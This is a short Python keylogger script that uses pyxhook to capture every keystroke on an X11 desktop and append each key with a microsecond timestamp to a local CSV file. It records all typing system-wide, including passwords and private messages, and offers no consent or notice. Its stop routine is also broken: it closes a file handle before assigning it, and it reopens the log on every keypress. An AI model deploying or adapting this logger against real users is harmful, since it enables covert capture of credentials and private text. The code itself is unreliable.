#!/usr/bin/env python
# -*- coding: utf-8 -*-
#

import pyxhook
from datetime import datetime, date, time

#change this to your log file's path
log_file = 'keylog.csv'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
	if event.Ascii == 96:
		f.close()
		new_hook.cancel()
	f = open(log_file,'a')
	hour = datetime.strftime(datetime.now(), "%H")
	mint = datetime.strftime(datetime.now(), "%M")
	secd = datetime.strftime(datetime.now(), "%S")
	secm = datetime.strftime(datetime.now(), "%f")
	now = (int(hour) * 3600000000) + (int(mint) * 60000000) + (int(secd) * 1000000) + int(secm)
	f.write(str(now))
	f.write(",")
	f.write(event.Key)
	f.write('\n')

#instantiate HookManager class
new_hook = pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown = OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
